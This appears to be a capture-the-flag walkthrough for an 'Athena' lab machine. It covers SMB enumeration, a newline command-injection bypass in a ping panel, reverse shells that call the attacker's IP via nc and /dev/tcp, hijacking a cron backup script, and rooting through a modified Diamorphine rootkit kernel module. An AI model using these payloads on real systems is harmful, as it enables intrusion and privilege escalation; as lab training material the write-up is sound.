# Athena - Medium

* Add ```athena.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v athena.thm```:

  * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.41 ((Ubuntu))
  * 139/tcp - netbios-ssn
  * 445/tcp - microsoft-ds

* The webpage on port 80 is about Athena - we can continue to go through this text while we start web scanning:

  ```sh
  gobuster dir -u http://athena.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  ```

* Enumerating the SMB services:

  ```sh
  smbclient -N -L //athena.thm
  # we have a 'public' share here

  smbclient //athena.thm/public
  # anonymous login works

  dir
  # we have a .txt file here

  get msg_for_administrator.txt

  exit

  cat msg_for_administrator.txt
  ```

* From the '.txt' file left in the SMB share, we get to know that the ping system being developed can be accessed through /myrouterpanel directory

* Navigating to /myrouterpanel, we have a 'Simple Router Panel' - various parts of it are in development, but the ping tool seems to work

* We can feed in some test input like ```127.0.0.1```, and after a couple of seconds, we get the output from /myrouterpanel/ping.php - the output seems to be from the ```ping``` command

* As we have an input field, we can begin by testing various [possible payloads for command injection](https://book.hacktricks.xyz/pentesting-web/command-injection); we can start by intercepting a valid request and sending it to Repeater in Burp Suite:

  * The data field for a valid request is ```ip=127.0.0.1&submit=```, with the latter parameter not being used and not having any impact as checked

  * For the 'ip' field, using the payload ```127.0.0.1; id``` results in 'Attempt hacking' error message - it seems the semicolon character is blacklisted

  * If we use backticks like "127.0.0.1`id`", this gives us an error 'Failed to execute ping'

  * If we use single or double quotes in our payload, we still don't get the ```ping``` command working

  * Using a payload such as ```127.0.0.1 && id``` helps in ```ping``` command execution, but we do not see the injected command output; similar output with single ampersand

  * Using the ```|``` character is also not allowed

  * When we use the ```127.0.0.1 %0A id``` payload, we are able to see the output of ```id``` command - this means the newline character works here

* As we have RCE now, we can use this to get a reverse-shell:

  ```sh
  # setup listener
  nc -nvlp 4444

  # we can try a few reverse-shell payloads to see which one works
  # the payload using 'nc' works
  # use this payload in the 'ip' field
  127.0.0.1 %0A nc -c sh 10.10.103.84 4444

  # on sending the request, we get a connection on our listener

  # we can upgrade our reverse shell first
  python3 -c 'import pty;pty.spawn("/bin/bash")'

  export TERM=xterm
  # Ctrl + Z

  stty raw -echo; fg
  # press Enter twice now

  id
  # www-data

  ls -la /home
  # we have two users - 'athena' and 'ubuntu'

  ls -la /home/athena
  # permission denied

  ls -la /home/ubuntu
  # permission denied

  # we can continue with basic enumeration
  ls -la /

  ls -la /var/www/html
  # check web directory for anything interesting

  ls -la /mnt
  # check for any mounted files or interesting files

  # we have a directory '...' here

  ls -la /mnt/...

  ls -la /mnt/.../secret
  # we have a .ko file here

  ls -la /mnt/.../secret/venom.ko
  # this seems to be a kernel module file

  # we can do a file transfer and check this in Ghidra
  
  # on attacker machine
  nc -nvlp 5555 > venom.ko

  # in reverse-shell
  nc 10.10.103.84 5555 -w 3 < /mnt/.../secret/venom.ko

  # simultaneously, we can also check for any cronjobs or running processes

  cat /etc/crontab
  # nothing found

  # we can check any processes running using pspy

  # in attacker machine, host the pspy64 binary
  python3 -m http.server 8000

  # in reverse-shell
  cd /tmp

  wget http://10.10.103.84:8000/pspy64

  chmod +x pspy64

  ./pspy64
  ```

* Using ```pspy```, we can see the following commands are executed periodically:

  * ```/bin/bash /usr/share/backup/backup.sh```
  * ```mkdir -p /home/athena/backup```
  * ```zip -r /home/athena/backup/notes_backup.zip /home/athena/backup```
  * ```rm /home/athena/backup/*.sh```
  * ```cp -r /home/athena/notes/msg_from_director.txt /home/athena/notes/mynote.txt /home/athena/backup```

* We can see if we are allowed to edit this script:

  ```sh
  ls -la /usr/share/backup/backup.sh
  # www-data has write permissions
  # we can edit this file and add a reverse-shell

  # on attacker, setup listener
  nc -nvlp 4445

  # in reverse shell
  vim /usr/share/backup/backup.sh

  # remove all lines and only keep the reverse-shell one-liner
  sh -i >& /dev/tcp/10.10.103.84/4445 0>&1

  # as it is in read-only mode
  # we need to do ':wq!' to save and quit

  cat /usr/share/backup/backup.sh
  # confirm the changes

  # in a while, we get a reverse shell on listener
  id
  # athena

  # we can upgrade this shell like previously done

  cd /home/athena

  # get user flag
  cat user.txt

  # do basic enumeration

  sudo -l
  ```

* From ```sudo -l``` output, we can see that 'athena' can run the following command as root - ```(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko``` - this includes the kernel module object file found earlier

* ```insmod``` is used to insert modules into the kernel to extend its functionality; in this case, we are unsure as to what the kernel module actually contains, so we will have to check further using ```ghidra```:

  * in ```ghidra```, before analyzing the function, we can do a 'String Search' (Search > For Strings) - this shows us interesting strings like "description=LKM rootkit" and "author=m0nad"

  * searching for these strings leads us to [Diamorphine](https://github.com/m0nad/Diamorphine), a LKM rootkit

  * from the GitHub page, we can see that after loading the kernel module, the given user can become root by sending a signal 64 to any PID - ```kill -64 0```

  * however, to understand the code before executing anything, we can upload the binary to an online decompiler tool such as [Decompiler Explorer](https://dogbolt.org/), and use the 'Ghidra' decompile option, and paste the output C code in ChatGPT for an overview (alternatively, we can view the code in Ghidra itself part-by-part, but this is an easier way)

  * from the above method, we can see the ```give_root``` function is responsible for granting root privileges, ```hacked_kill``` intercepts the ```kill``` system call to modify its behavior

  * checking further to see when ```give_root``` gets executed, we can see it is called within ```hacked_kill``` function when the signal to send, 'sig', is set to 0x39

  * using ```echo $((0x39))``` (converting hex to decimal), we get the value 57

  * so the change from the original code for the rootkit is in this function itself - now we can try to send signal 57

* From the above analysis, we can proceed to send signal 57 after loading the module:

  ```sh
  sudo -l

  sudo /usr/sbin/insmod /mnt/.../secret/venom.ko

  kill -57 0
  # sending signal 57 to any PID
  # again, this should have been 64 according to the original Diamorphine rootkit code
  # but the code was modified in this case

  id
  # we have root uid now
  # we can get the root flag
  ```
